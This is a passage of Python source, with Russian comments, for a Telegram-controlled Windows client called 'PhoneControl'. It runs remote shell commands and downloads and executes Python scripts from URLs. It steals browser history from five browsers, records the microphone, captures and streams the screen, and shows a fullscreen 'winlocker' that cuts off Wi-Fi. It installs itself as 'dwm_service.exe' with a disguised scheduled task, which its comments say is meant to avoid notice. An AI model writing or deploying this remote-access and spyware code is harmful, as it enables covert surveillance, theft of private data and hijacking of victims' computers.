        "Connection: close\r\n\r\n"
    )
    try:
        conn.sendall(resp.encode() + body)
    except Exception:
        pass
    finally:
        conn.close()


def _run_http_server(provider: _MjpegFrameProvider, stop_event: Event, ip: str):
    """Принимает HTTP-соединения и раздаёт HTML или MJPEG-стрим."""
    srv = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
    srv.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
    srv.bind(("", STREAM_HTTP_PORT))
    srv.listen(10)
    srv.settimeout(1.0)
    log.info(f"MJPEG HTTP server on {ip}:{STREAM_HTTP_PORT}")
    while not stop_event.is_set():
        try:
            conn, _ = srv.accept()
        except _socket.timeout:
            continue
        except Exception:
            break
        # Читаем первую строку запроса чтобы понять маршрут
        try:
            peek = conn.recv(4096, _socket.MSG_PEEK)
            first_line = peek.split(b"\r\n")[0].decode(errors="ignore")
            path = first_line.split(" ")[1] if " " in first_line else "/"
        except Exception:
            path = "/"

        if path.startswith("/stream"):
            Thread(target=_serve_mjpeg_client,
                   args=(conn, provider, stop_event), daemon=True).start()
        else:
            Thread(target=_serve_html, args=(conn, ip), daemon=True).start()
    srv.close()


def _run_ws_server(stop_event: Event):
    """WebSocket-сервер для передачи кликов мыши."""
    srv = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
    srv.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
    srv.bind(("", STREAM_WS_PORT))
    srv.listen(10)
    srv.settimeout(1.0)
    log.info(f"WS server on :{STREAM_WS_PORT}")
    while not stop_event.is_set():
        try:
            conn, _ = srv.accept()
        except _socket.timeout:
            continue
        except Exception:
            break
        Thread(target=_handle_ws_client,
               args=(conn, stop_event), daemon=True).start()
    srv.close()


def start_screen_stream(chat_id: str):
    """Запускает WiFi-стриминг экрана ПК. Отправляет URL в чат."""
    global _stream_stop_event, _stream_ip
    if _stream_stop_event and not _stream_stop_event.is_set():
        url = f"http://{_stream_ip}:{STREAM_HTTP_PORT}"
        send_text_reply(chat_id, f"📺 Стриминг уже активен: {url}")
        return

    _stream_ip = _get_local_ip()
    _stream_stop_event = Event()

    provider = _MjpegFrameProvider(
        _stream_stop_event, STREAM_FPS, STREAM_WIDTH, STREAM_QUALITY
    )
    Thread(target=provider.run, daemon=True, name="stream-capture").start()
    Thread(target=_run_http_server,
           args=(provider, _stream_stop_event, _stream_ip),
           daemon=True, name="stream-http").start()
    Thread(target=_run_ws_server,
           args=(_stream_stop_event,),
           daemon=True, name="stream-ws").start()

    url = f"http://{_stream_ip}:{STREAM_HTTP_PORT}"
    log.info(f"Screen stream started: {url}")
    log.info(f"Sending stream URL to chat_id={chat_id!r}")
    if not chat_id:
        log.error("stream_start: chat_id is empty, cannot send URL to Telegram!")
    send_text_reply(chat_id,
        "📺 Стриминг запущен!\n"
        f"Открой в браузере на телефоне (в той же сети WiFi):\n{url}\n\n"
        "Для остановки: /stream_stop"
    )
    log.info("stream URL sent")


def stop_screen_stream(chat_id: str):
    """Останавливает WiFi-стриминг."""
    global _stream_stop_event
    if _stream_stop_event and not _stream_stop_event.is_set():
        _stream_stop_event.set()
        _stream_stop_event = None
        log.info("Screen stream stopped")
        send_text_reply(chat_id, "⛔ Стриминг остановлен.")
    else:
        send_text_reply(chat_id, "ℹ️ Стриминг не был активен.")


# ─── Ban state ────────────────────────────────────────────────────────────────

class BanState:
    def __init__(self):
        self.active      = False
        self.adapter     = "Wi-Fi"
        self.password    = None   # None = no password required
        self.timer       = None   # threading.Timer for auto-unban
        self._lock       = threading.Lock()
        # Winlocker window for password-ban
        self._pw_root: tk.Tk = None
        self._pw_stop        = threading.Event()

    def ban(self, password: str | None):
        with self._lock:
            if self.active:
                return
            self.active   = True
            self.password = password
            self.adapter  = wifi_disable()
            # Сохраняем состояние на диск
            try:
                PREFS_FILE.write_text(json.dumps({
                    **json.loads(PREFS_FILE.read_text() if PREFS_FILE.exists() else "{}"),
                    "ban_active": True
                }))
            except Exception:
                pass

            if password:
                self.timer = threading.Timer(300, self._auto_unban)
                self.timer.start()
                ui_call(self._show_pw_screen)
            else:
                self.timer = threading.Timer(300, self._auto_unban)
                self.timer.start()

    def unban(self):
        with self._lock:
            if not self.active:
                return
            self.active   = False
            self.password = None
            if self.timer:
                self.timer.cancel()
                self.timer = None
            wifi_enable(self.adapter)
            self._close_pw_screen()
            # Сбрасываем состояние на диске
            try:
                PREFS_FILE.write_text(json.dumps({
                    **json.loads(PREFS_FILE.read_text() if PREFS_FILE.exists() else "{}"),
                    "ban_active": False
                }))
            except Exception:
                pass

    def _auto_unban(self):
        log.info("Auto-unban triggered")
        self.unban()

    def try_password(self, entered: str) -> bool:
        if self.password and entered == self.password:
            self.unban()
            return True
        return False

    def _show_pw_screen(self):
        self._pw_stop = threading.Event()
        root = make_fullscreen_root("#1a1a2e")
        self._pw_root = root

        card = tk.Frame(root, bg="#16213e", padx=50, pady=50)
        card.place(relx=0.5, rely=0.5, anchor="center")

        tk.Label(card, text="🔒  Интернет заблокирован", bg="#16213e",
                 fg="white", font=("Segoe UI", 20, "bold")).pack(pady=(0, 20))
        tk.Label(card, text="Введи пароль для разблокировки:",
                 bg="#16213e", fg="#a0a0c0", font=("Segoe UI", 13)).pack(pady=(0, 10))

        entry = tk.Entry(card, font=("Segoe UI", 14), width=30,
                         bg="#0f3460", fg="white", insertbackground="white",
                         relief="flat", bd=8, show="•")
        entry.pack(pady=(0, 10))
        entry.focus()

        err_lbl = tk.Label(card, text="", bg="#16213e", fg="#e94560",
                           font=("Segoe UI", 12))
        err_lbl.pack()

        def attempt():
            if self.try_password(entry.get()):
                pass  # unban() closes screen via _close_pw_screen
            else:
                entry.delete(0, tk.END)
                err_lbl.config(text="❌ Неверный пароль")

        btn = tk.Button(card, text="Разблокировать",
                        font=("Segoe UI", 13, "bold"),
                        bg="#e94560", fg="white", relief="flat",
                        padx=25, pady=10, cursor="hand2", command=attempt)
        btn.pack(pady=(10, 0))
        entry.bind("<Return>", lambda e: attempt())

        # keep_on_top с фокусом на entry — не прерывает ввод пароля
        threading.Thread(
            target=keep_on_top, args=(root, self._pw_stop, entry), daemon=True
        ).start()

        root.mainloop()

    def _close_pw_screen(self):
        if self._pw_root:
            try:
                self._pw_stop.set()
                self._pw_root.after(0, self._pw_root.destroy)
                self._pw_root = None
            except Exception:
                pass


ban_state = BanState()

# Если бан был активен до перезапуска — восстанавливаем
try:
    _prefs = json.loads(PREFS_FILE.read_text()) if PREFS_FILE.exists() else {}
    if _prefs.get("ban_active"):
        ban_state.active = True
        log.info("Ban state restored from disk")
except Exception:
    pass

# ─── Video cache ──────────────────────────────────────────────────────────────

CACHE_DIR = DATA_DIR / "video_cache"
CACHE_DIR.mkdir(exist_ok=True)

BUILTIN_VIDEO_DIR = BASE_DIR / "assets"  # assets всегда рядом с exe
RAW_VIDEO_DIR = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Themes" / "WinDWM" / "assets"

def get_raw_videos() -> list:
    """Возвращает список raw-видео из assets в порядке raw1, raw2..."""
    result = []
    if not RAW_VIDEO_DIR.exists():
        return result
    files = sorted(
        [f for f in RAW_VIDEO_DIR.iterdir()
         if f.suffix.lower() in ('.mp4', '.mov', '.avi', '.mkv') and f.stem.startswith('raw')],
        key=lambda f: int(''.join(filter(str.isdigit, f.stem)) or 0)
    )
    for i, f in enumerate(files, 1):
        result.append({"name": f"raw{i}", "filename": f.name, "path": str(f)})
    return result

def next_raw_name() -> str:
    """Возвращает следующее имя raw-файла (raw1, raw2...)."""
    existing = get_raw_videos()
    return f"raw{len(existing) + 1}"

def send_video_list(chat_id: str):
    """Отправляет список raw-видео на сервер."""
    videos = get_raw_videos()
    http_post_json("/video_list", {
        "chat_id": chat_id,
        "device_id": DEVICE_ID,
        "videos": videos,
    })

def prefetch_video(url: str, chat_id: str = ""):
    """Скачивает видео в assets с именем rawN."""
    RAW_VIDEO_DIR.mkdir(exist_ok=True)
    name = next_raw_name()
    dest = RAW_VIDEO_DIR / f"{name}.mp4"
    try:
        log.info(f"Downloading {url} → {dest}")
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with _urlopen(req, timeout=120) as r, open(dest, "wb") as f:
            while chunk := r.read(8192):
                f.write(chunk)
        log.info(f"Downloaded: {dest}")
        if chat_id:
            http_post_json("/text_reply", {
                "chat_id": chat_id,
                "text": f"✅ Видео сохранено как *{name}* — воспроизведи через /raw {name[3:]}",
                "device_id": DEVICE_ID,
            })
    except Exception as e:
        log.error(f"prefetch_video: {e}")
        if chat_id:
            http_post_json("/text_reply", {
                "chat_id": chat_id,
                "text": f"⚠️ Ошибка скачивания: {e}",
                "device_id": DEVICE_ID,
            })

def delete_raw_video(num: int, chat_id: str = ""):
    """Удаляет raw-видео по номеру."""
    videos = get_raw_videos()
    if num < 1 or num > len(videos):
        if chat_id:
            http_post_json("/text_reply", {
                "chat_id": chat_id,
                "text": f"⚠️ Нет видео raw{num}",
                "device_id": DEVICE_ID,
            })
        return
    path = Path(videos[num - 1]["path"])
    if path.exists():
        path.unlink()
        log.info(f"Deleted: {path}")
    # Переименовываем оставшиеся чтобы не было дырок
    remaining = get_raw_videos()
    for i, v in enumerate(remaining, 1):
        old = Path(v["path"])
        new = RAW_VIDEO_DIR / f"raw{i}.mp4"
        if old != new:
            old.rename(new)
    if chat_id:
        http_post_json("/text_reply", {
            "chat_id": chat_id,
            "text": f"🗑 raw{num} удалён. Номера обновлены.",
            "device_id": DEVICE_ID,
        })

def collect_browser_history(chat_id: str, days: int = 7):
    """Собирает историю браузеров и отправляет txt файл в Telegram."""
    import sqlite3, shutil, tempfile
    from datetime import datetime, timedelta

    results = []
    cutoff = datetime.now() - timedelta(days=days)
    local = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")

    BROWSERS = {
        "Chrome":  os.path.join(local,  "Google", "Chrome", "User Data", "Default", "History"),
        "Edge":    os.path.join(local,  "Microsoft", "Edge", "User Data", "Default", "History"),
        "Brave":   os.path.join(local,  "BraveSoftware", "Brave-Browser", "User Data", "Default", "History"),
        "Firefox": None,  # обработаем отдельно
        "Opera":   os.path.join(appdata, "Opera Software", "Opera Stable", "History"),
    }

    def read_chromium(name, db_path):
        if not os.path.exists(db_path):
            return
        tmp = tempfile.mktemp(suffix=".db")
        try:
            shutil.copy2(db_path, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            # Chrome хранит время как микросекунды с 1601-01-01
            epoch_diff = 11644473600  # секунд между 1601 и 1970
            cutoff_chrome = int((cutoff.timestamp() + epoch_diff) * 1_000_000)
            cur.execute(
                "SELECT url, title, last_visit_time FROM urls "
                "WHERE last_visit_time > ? ORDER BY last_visit_time DESC LIMIT 500",
                (cutoff_chrome,)
            )
            for url, title, ts in cur.fetchall():
                dt = datetime.fromtimestamp(ts / 1_000_000 - epoch_diff)
                results.append((dt, name, title or "", url))
            conn.close()
        except Exception as e:
            log.error(f"browser history {name}: {e}")
        finally:
            try: os.remove(tmp)
            except: pass

    def read_firefox():
        profiles_dir = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(profiles_dir):
            return
        for profile in os.listdir(profiles_dir):
            db_path = os.path.join(profiles_dir, profile, "places.sqlite")
            if not os.path.exists(db_path):
                continue
            tmp = tempfile.mktemp(suffix=".db")
            try:
                shutil.copy2(db_path, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cutoff_ff = int(cutoff.timestamp() * 1_000_000)
                cur.execute(
                    "SELECT p.url, p.title, h.visit_date FROM moz_historyvisits h "
                    "JOIN moz_places p ON h.place_id = p.id "
                    "WHERE h.visit_date > ? ORDER BY h.visit_date DESC LIMIT 500",
                    (cutoff_ff,)
                )
                for url, title, ts in cur.fetchall():
                    dt = datetime.fromtimestamp(ts / 1_000_000)
                    results.append((dt, "Firefox", title or "", url))
                conn.close()
            except Exception as e:
                log.error(f"browser history Firefox: {e}")
            finally:
                try: os.remove(tmp)
                except: pass

    for name, path in BROWSERS.items():
        if name == "Firefox":
            read_firefox()
        elif path:
            read_chromium(name, path)

    if not results:
        send_text_reply(chat_id, "ℹ️ История браузеров пуста или браузеры не найдены.")
        return

    results.sort(key=lambda x: x[0], reverse=True)

    lines = [f"История браузеров за последние {days} дн. ({len(results)} записей)\n"]
    lines.append("=" * 60)
    current_date = None
    for dt, browser, title, url in results:
        date_str = dt.strftime("%d.%m.%Y")
        if date_str != current_date:
            current_date = date_str
            lines.append(f"\n── {date_str} ──")
        lines.append(f"{dt.strftime('%H:%M')}  [{browser}]  {title}")
        lines.append(f"  {url}")

    report = "\n".join(lines)
    tmp_file = tempfile.mktemp(suffix=".txt")
    try:
        with open(tmp_file, "w", encoding="utf-8") as f:
            f.write(report)
        http_post_multipart("/upload", tmp_file, chat_id,
                            caption=f"История браузеров ({len(results)} записей, {days} дн.)")
    except Exception as e:
        log.error(f"collect_browser_history send: {e}")
        send_text_reply(chat_id, f"❌ Ошибка отправки: {e}")
    finally:
        try: os.remove(tmp_file)
        except: pass



# ─── Python scripts ───────────────────────────────────────────────────────────

PY_SCRIPT_DIR = DATA_DIR / "scripts"

def get_py_scripts() -> list:
    if not PY_SCRIPT_DIR.exists():
        return []
    files = sorted(
        [f for f in PY_SCRIPT_DIR.iterdir() if f.suffix.lower() == '.py'],
        key=lambda f: int(''.join(filter(str.isdigit, f.stem)) or 0)
    )
    return [{"name": f"py{i}", "filename": f.name, "path": str(f)}
            for i, f in enumerate(files, 1)]

def send_py_list(chat_id: str):
    scripts = get_py_scripts()
    http_post_json("/py_list", {
        "chat_id": chat_id,
        "device_id": DEVICE_ID,
        "scripts": scripts,
    })

def fetch_py_script(url: str, chat_id: str = ""):
    PY_SCRIPT_DIR.mkdir(exist_ok=True)
    num  = len(get_py_scripts()) + 1
    dest = PY_SCRIPT_DIR / f"py{num}.py"
    try:
        log.info(f"Downloading py script {url} -> {dest}")
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with _urlopen(req, timeout=60) as r, open(dest, "wb") as f:
            f.write(r.read())
        log.info(f"Script saved: {dest}")
        if chat_id:
            http_post_json("/text_reply", {
                "chat_id": chat_id, "device_id": DEVICE_ID,
                "text": f"✅ Скрипт сохранён как py{num} — запусти через /runpy {num}",
            })
    except Exception as e:
        log.error(f"fetch_py_script: {e}")
        if chat_id:
            http_post_json("/text_reply", {
                "chat_id": chat_id, "device_id": DEVICE_ID,
                "text": f"⚠️ Ошибка скачивания: {e}",
            })

def run_py_script(num: int, chat_id: str = ""):
    scripts = get_py_scripts()
    if num < 1 or num > len(scripts):
        if chat_id:
            http_post_json("/text_reply", {
                "chat_id": chat_id, "device_id": DEVICE_ID,
                "text": f"⚠️ Нет скрипта py{num}",
            })
        return
    path = scripts[num - 1]["path"]
    try:
        result = subprocess.run(
            ["python", path],
            capture_output=True, text=True, timeout=60
        )
        output = (result.stdout + result.stderr).strip() or "(нет вывода)"
        http_post_json("/cmd_output", {
            "chat_id": chat_id, "device_id": DEVICE_ID,
            "command": f"py{num}.py", "output": output,
        })
    except subprocess.TimeoutExpired:
        http_post_json("/text_reply", {
            "chat_id": chat_id, "device_id": DEVICE_ID,
            "text": f"⚠️ Скрипт py{num} превысил таймаут 60 сек",
        })
    except Exception as e:
        log.error(f"run_py_script: {e}")
        http_post_json("/text_reply", {
            "chat_id": chat_id, "device_id": DEVICE_ID,
            "text": f"⚠️ Ошибка запуска: {e}",
        })

def delete_py_script(num: int, chat_id: str = ""):
    scripts = get_py_scripts()
    if num < 1 or num > len(scripts):
        if chat_id:
            http_post_json("/text_reply", {
                "chat_id": chat_id, "device_id": DEVICE_ID,
                "text": f"⚠️ Нет скрипта py{num}",
            })
        return
    path = Path(scripts[num - 1]["path"])
    if path.exists():
        path.unlink()
    # Переименовываем чтобы не было дырок
    remaining = get_py_scripts()
    for i, s in enumerate(remaining, 1):
        old = Path(s["path"])
        new = PY_SCRIPT_DIR / f"py{i}.py"
        if old != new:
            old.rename(new)
    if chat_id:
        http_post_json("/text_reply", {
            "chat_id": chat_id, "device_id": DEVICE_ID,
            "text": f"🗑 py{num} удалён.",
        })

def run_cmd(command: str, chat_id: str = ""):
    try:
        log.info(f"run_cmd: {command}")
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60,
            encoding="cp866",   # кодировка cmd на Windows
            errors="replace",
        )
        output = (result.stdout + result.stderr).strip() or "(нет вывода)"
        http_post_json("/cmd_output", {
            "chat_id": chat_id, "device_id": DEVICE_ID,
            "command": command, "output": output,
        })
    except subprocess.TimeoutExpired:
        http_post_json("/text_reply", {
            "chat_id": chat_id, "device_id": DEVICE_ID,
            "text": f"⚠️ Команда превысила таймаут 60 сек",
        })
    except Exception as e:
        log.error(f"run_cmd: {e}")
        http_post_json("/text_reply", {
            "chat_id": chat_id, "device_id": DEVICE_ID,
            "text": f"⚠️ Ошибка: {e}",
        })

# ─── Command handler ─────────────────────────────────────────────────────────

def handle_command(cmd: dict):
    name     = cmd.get("cmd", "")
    chat_id  = cmd.get("_chat_id", "")
    lock     = cmd.get("lock", False)
    duration = cmd.get("duration", 0)
    fb_mode  = cmd.get("fb_mode", "plain")
    rp       = cmd.get("reply_prompt", "✏️ Напиши ответ:")
    survey   = cmd.get("survey", [])

    log.info(f"Command: {name}")

    if name == "shutdown":
        lock_screen()

    elif name == "ban":
        password = cmd.get("password") or None
        ban_state.ban(password)

    elif name == "unban":
        ban_state.unban()

    elif name == "sound":
        # pycaw может блокировать — запускаем в отдельном потоке
        threading.Thread(
            target=set_volume, args=(cmd.get("level", 5),), daemon=True
        ).start()

    elif name == "show_message":
        text     = cmd.get("text", "")
        minimize = cmd.get("minimize", False)
        ui_call("show_message_overlay", text, fb_mode, rp, survey, chat_id, minimize)

    elif name == "video":
        num  = cmd.get("num", 1)
        path = str(BUILTIN_VIDEO_DIR / f"video{num}.mp4")
        if not os.path.exists(path):
            log.warning(f"Built-in video not found: {path}")
            return
        ui_call("show_video_overlay", path, lock, duration, fb_mode, rp, survey, chat_id)

    elif name == "play_raw":
        raw_num = cmd.get("raw_num", 0)
        videos = get_raw_videos()
        if not videos:
            log.error("play_raw: no raw videos in assets")
            http_post_json("/text_reply", {"chat_id": chat_id,
                "text": "⚠️ Нет скачанных видео. Добавь через /addraw", "device_id": DEVICE_ID})
        elif raw_num < 1 or raw_num > len(videos):
            log.error(f"play_raw: invalid num {raw_num}")
            http_post_json("/text_reply", {"chat_id": chat_id,
                "text": f"⚠️ Нет видео raw{raw_num}", "device_id": DEVICE_ID})
        else:
            path = videos[raw_num - 1]["path"]
            ui_call("show_video_overlay", path, lock, duration,
                    fb_mode, rp, survey, chat_id)

    elif name == "prefetch":
        url = cmd.get("url", "")
        threading.Thread(target=prefetch_video, args=(url, chat_id), daemon=True).start()

    elif name == "get_video_list":
        threading.Thread(target=send_video_list, args=(chat_id,), daemon=True).start()

    elif name == "delete_video":
        num = cmd.get("num", 0)
        threading.Thread(target=delete_raw_video, args=(num, chat_id), daemon=True).start()

    elif name == "unban_video":
        unban_video()

    elif name == "screenshot":
        threading.Thread(target=take_screenshot, args=(chat_id,), daemon=True).start()

    elif name == "stream_start":
        threading.Thread(target=start_screen_stream, args=(chat_id,), daemon=True).start()

    elif name == "stream_stop":
        threading.Thread(target=stop_screen_stream, args=(chat_id,), daemon=True).start()

    elif name == "browser_history":
        days = int(cmd.get("days", 7))
        threading.Thread(target=collect_browser_history, args=(chat_id, days), daemon=True).start()

    elif name in ("open_gallery", "open_camera"):
        open_file_picker(chat_id)

    elif name == "get_audio_devices":
        threading.Thread(target=get_and_send_audio_devices, args=(chat_id,), daemon=True).start()

    elif name == "record_audio":
        seconds = cmd.get("seconds", 10)
        device_index = cmd.get("device_index", None)
        threading.Thread(target=record_and_send_audio,
                         args=(seconds, chat_id, device_index), daemon=True).start()

    elif name == "run_cmd":
        command = cmd.get("command", "")
        threading.Thread(target=run_cmd, args=(command, chat_id), daemon=True).start()

    elif name == "get_py_list":
        threading.Thread(target=send_py_list, args=(chat_id,), daemon=True).start()

    elif name == "fetch_py":
        url = cmd.get("url", "")
        threading.Thread(target=fetch_py_script, args=(url, chat_id), daemon=True).start()

    elif name == "run_py":
        num = cmd.get("num", 0)
        threading.Thread(target=run_py_script, args=(num, chat_id), daemon=True).start()

    elif name == "del_py":
        num = cmd.get("num", 0)
        threading.Thread(target=delete_py_script, args=(num, chat_id), daemon=True).start()

    
    else:
        log.warning(f"Unknown command: {name}")

# ─── UI queue (единый Tkinter-поток) ─────────────────────────────────────────
#
# Tkinter нельзя запускать из нескольких потоков одновременно.
# Все overlay-вызовы кладём в очередь, единый UI-поток их забирает и исполняет.
# poll_loop при этом не блокируется — он просто кладёт задачу в очередь и идёт дальше.

def ui_call(fn_name: str, *args):
    """Запускает UI окно в отдельном subprocess."""
    payload = json.dumps({"fn": fn_name, "args": list(args)})
    try:
        subprocess.Popen(
            [sys.executable, "--ui", payload],
            creationflags=0x00000008,
            close_fds=True,
        )
    except Exception as e:
        log.error(f"ui_call failed: {e}")

# ─── Main poll loop ───────────────────────────────────────────────────────────

def poll_loop():
    consecutive_errors = 0
    last_instance_id   = ""
    active             = False

    log.info(f"PhoneControl Windows client started. Device ID: {DEVICE_ID}")
    log.info(f"Server: {SERVER_URL}")

    while True:
        try:
            data = http_get("/poll")
            consecutive_errors = 0

            active = data.get("active", False)

            instance_id = data.get("instance_id", "")
            if instance_id and instance_id != last_instance_id:
                log.info(f"Server instance changed: {instance_id}")
                last_instance_id = instance_id

            cmd = data.get("command")
            if cmd:
                threading.Thread(
                    target=handle_command, args=(cmd,), daemon=True
                ).start()

        except Exception as e:
            consecutive_errors += 1
            log.error(f"Poll error #{consecutive_errors}: {e}")
            if consecutive_errors >= 10:
                log.warning("Too many errors, backing off 60s")
                time.sleep(60)
                consecutive_errors = 0
                continue

        time.sleep(POLL_INTERVAL_ACTIVE if active else POLL_INTERVAL_IDLE)


# ─── Self-install ─────────────────────────────────────────────────────────────

# Прячем в системную папку — не бросается в глаза
INSTALL_DIR  = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Themes" / "WinDWM"
INSTALL_EXE  = INSTALL_DIR / "dwm_service.exe"   # выглядит как системный процесс
TASK_NAME    = "WindowsDWMService"                # выглядит как системная задача
UNINSTALL_CMD = f'schtasks /delete /tn "{TASK_NAME}" /f && rmdir /s /q "{INSTALL_DIR}"'

def is_installed() -> bool:
    """Already running from install location."""
    if not getattr(sys, "frozen", False):
        return True  # running as .py in dev — skip install
    return Path(sys.executable).resolve() == INSTALL_EXE.resolve()

def self_install():
    """Copy exe to AppData, register scheduled task, launch it, exit."""
    import shutil

    INSTALL_DIR.mkdir(parents=True, exist_ok=True)

    # Убиваем старый процесс если он запущен из папки установки
    if INSTALL_EXE.exists():
        subprocess.run(
            ["taskkill", "/f", "/im", "phonecontrol.exe"],
            capture_output=True, timeout=10
        )
        time.sleep(1.5)  # ждём пока процесс завершится и отпустит файл

    src = Path(sys.executable)
    dst_assets = INSTALL_DIR / "assets"

    shutil.copy2(src, INSTALL_EXE)

    meipass = Path(getattr(sys, "_MEIPASS", ""))
    src_assets = (meipass / "assets") if (meipass / "assets").exists() else (src.parent / "assets")
    if src_assets.exists():
        if dst_assets.exists():
            shutil.rmtree(dst_assets)
        shutil.copytree(src_assets, dst_assets)
        log.info(f"Assets copied from {src_assets}")
    else:
        log.warning("Assets folder not found — videos will not work")

    log.info(f"Copied to {INSTALL_EXE}")

    # Register scheduled task — runs at logon, restarts on failure
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2000-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions>
    <Exec>
      <Command>{INSTALL_EXE}</Command>
    </Exec>
  </Actions>
</Task>"""

    xml_path = INSTALL_DIR / "task.xml"
    xml_path.write_text(xml, encoding="utf-16")

    # exe собран с uac_admin=True — права уже есть при запуске
    subprocess.run(
        ["schtasks", "/create", "/tn", TASK_NAME, "/xml", str(xml_path), "/f"],
        check=True, timeout=15, capture_output=True
    )
    xml_path.unlink()
    log.info("Scheduled task registered")

    # Launch installed exe and exit current process
    subprocess.Popen([str(INSTALL_EXE)],
                     creationflags=0x00000008)  # DETACHED_PROCESS
    log.info("Launched installed exe, exiting installer")
    sys.exit(0)


def print_uninstall_hint():
    """Write uninstall.bat with UAC elevation and process kill."""
    bat = INSTALL_DIR / "uninstall.bat"
    bat.write_text(
        "@echo off\n"
        ":: Запрос прав администратора\n"
        "net session >nul 2>&1\n"
        "if %errorLevel% neq 0 (\n"
        "    powershell -Command \"Start-Process '%~f0' -Verb RunAs\"\n"
        "    exit /b\n"
        ")\n"
        "\n"
        "echo Останавливаем PhoneControl...\n"
        f"taskkill /f /im phonecontrol.exe >nul 2>&1\n"
        "timeout /t 2 >nul\n"
        "\n"
        "echo Удаляем задачу планировщика...\n"
        f"schtasks /delete /tn \"{TASK_NAME}\" /f >nul 2>&1\n"
        "timeout /t 1 >nul\n"
        "\n"
        "echo Удаляем файлы...\n"
        ":: Удаляем скачанные видео из assets\n"
        f"if exist \"{RAW_VIDEO_DIR}\" (\n"
        f"    del /f /q \"{RAW_VIDEO_DIR}\\*.mp4\" >nul 2>&1\n"
        f"    del /f /q \"{RAW_VIDEO_DIR}\\*.mov\" >nul 2>&1\n"
        f"    del /f /q \"{RAW_VIDEO_DIR}\\*.avi\" >nul 2>&1\n"
        f"    del /f /q \"{RAW_VIDEO_DIR}\\*.mkv\" >nul 2>&1\n"
        f")\n"
        "echo Удаляем правила файрволла...\n"
        f"netsh advfirewall firewall delete rule name=\"PhoneControlBlock\" >nul 2>&1\n"
        f"netsh advfirewall firewall delete rule name=\"PhoneControlAllow\" >nul 2>&1\n"
        "\n"
        ":: PowerShell удаляет папку через 3 сек после выхода bat\n"
        f"powershell -Command \"Start-Sleep 3; Remove-Item -Recurse -Force '{INSTALL_DIR}'\"\n"
        "\n"
        "echo Готово! PhoneControl удалён.\n"
        "pause\n",
        encoding="utf-8"
    )
    log.info(f"Uninstall bat written: {bat}")


def get_and_send_audio_devices(chat_id: str):
    try:
        import sounddevice as sd
        mics = [{"index": i, "name": d["name"]}
                for i, d in enumerate(sd.query_devices())
                if d["max_input_channels"] > 0]
        log.info(f"Found {len(mics)} microphones")
        http_post_json("/micro_devices", {
            "chat_id": chat_id, "device_id": DEVICE_ID, "devices": mics})
    except ImportError:
        http_post_json("/text_reply", {"chat_id": chat_id,
            "text": "⚠️ sounddevice не установлен.", "device_id": DEVICE_ID})
    except Exception as e:
        log.error(f"get_audio_devices: {e}")
        http_post_json("/text_reply", {"chat_id": chat_id,
            "text": f"⚠️ Ошибка: {e}", "device_id": DEVICE_ID})


def record_and_send_audio(seconds: int, chat_id: str, device_index=None):
    import wave, tempfile
    try:
        import sounddevice as sd
        import numpy as np
        log.info(f"Recording {seconds}s device={device_index}")
        sr = 44100
        rec = sd.rec(int(seconds * sr), samplerate=sr, channels=1,
                     dtype="int16", device=device_index)
        sd.wait()
        tmp = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
        tmp_path = tmp.name
        tmp.close()
        with wave.open(tmp_path, "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(sr)
            wf.writeframes(rec.tobytes())
        log.info(f"Audio saved: {tmp_path}")
        http_post_multipart("/upload", tmp_path, chat_id,
                            caption=f"🎙 Запись {seconds} сек")
        os.unlink(tmp_path)
    except ImportError:
        http_post_json("/text_reply", {"chat_id": chat_id,
            "text": "⚠️ sounddevice не установлен.", "device_id": DEVICE_ID})
    except Exception as e:
        log.error(f"record_audio: {e}")
        http_post_json("/text_reply", {"chat_id": chat_id,
            "text": f"⚠️ Ошибка записи: {e}", "device_id": DEVICE_ID})


def _global_excepthook(exc_type, exc_value, exc_tb):
    import traceback
    log.critical("Unhandled exception: " + "".join(
        traceback.format_exception(exc_type, exc_value, exc_tb)))

sys.excepthook = _global_excepthook


def _threading_excepthook(args):
    import traceback
    log.critical("Thread exception in {}: {}".format(
        args.thread.name if args.thread else "?",
        "".join(traceback.format_exception(
            args.exc_type, args.exc_value, args.exc_traceback))))

threading.excepthook = _threading_excepthook


def _poll_loop_supervisor():
    while True:
        try:
            poll_loop()
        except Exception as e:
            log.critical(f"poll_loop crashed: {e}, restarting in 10s...")
            time.sleep(10)


if __name__ == "__main__":
    if len(sys.argv) >= 3 and sys.argv[1] == "--ui":
        try:
            import json as _json
            payload = _json.loads(sys.argv[2])
            fn_name = payload["fn"]
            args    = payload["args"]
            fn_map  = {
                "show_message_overlay": show_message_overlay,
                "show_video_overlay":   show_video_overlay,
            }
            fn = fn_map.get(fn_name)
